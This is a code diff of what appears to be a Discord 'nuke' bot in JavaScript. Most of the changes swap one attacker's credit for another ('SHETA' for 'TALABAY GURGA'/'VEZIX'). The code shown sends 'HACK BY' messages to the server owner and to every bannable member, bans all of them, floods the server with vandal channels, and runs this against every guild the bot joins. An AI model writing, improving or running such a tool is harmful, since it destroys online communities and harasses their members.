+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
@@ -992,14 +1029,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send('HACK BY TALABAY G̷ U̷ R̷ G̷ A̷ 🛠').catch(e => { return void e; });
+  await guild.owner.send('HACK BY SHETAGYAN HHHH SERVARAKAU JWANA 🛠').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('^HACK BY TALABAY G̷ U̷ R̷ G̷ A̷ 🛠^').catch(e => { return void e; });
+      await m.send('^HACK BY SHETAGYAN 🛠^').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -1011,9 +1048,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'text');
+    await guild.createChannel('Hack by SHETAGYAN 🛠', 'text');
  
-      await guild.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+      await guild.createChannel('Hack by Sheta 🛠', 'voice');
  
  
  
@@ -1023,7 +1060,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by VEZIX");
+  console.log("Made by SHETA");
   console.log("");
   console.log("-------------------------------------------------------------");
  
